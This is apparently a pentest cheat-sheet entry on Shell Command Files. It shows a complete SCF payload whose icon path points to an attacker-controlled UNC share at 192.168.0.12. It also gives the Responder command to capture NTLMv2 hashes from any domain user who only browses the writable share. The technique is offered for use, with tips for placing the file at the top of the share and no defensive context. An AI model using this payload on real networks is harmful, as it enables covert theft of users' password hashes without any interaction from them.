# SCF (Shell Command Files)
> If a file share doesn’t contain any data that could be used to connect to other systems but it is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users. It is not new that SCF files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path.
```console
[Shell]
Command=2
IconFile=\\192.168.0.12\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
Saving as SCF file will make the file to be executed when the user will browse the file. Adding the **@** symbol in front of the filename will place the pentestlab.scf on the top of the share drive.

Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.
```console
responder -wrf --lm -v -I eth0
```
When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.

> The main advantage of the technique above it that it doesn’t require any user interaction and automatically enforces the user to connect to a share the doesn’t exist negotiating his NTLMv2 hash. 
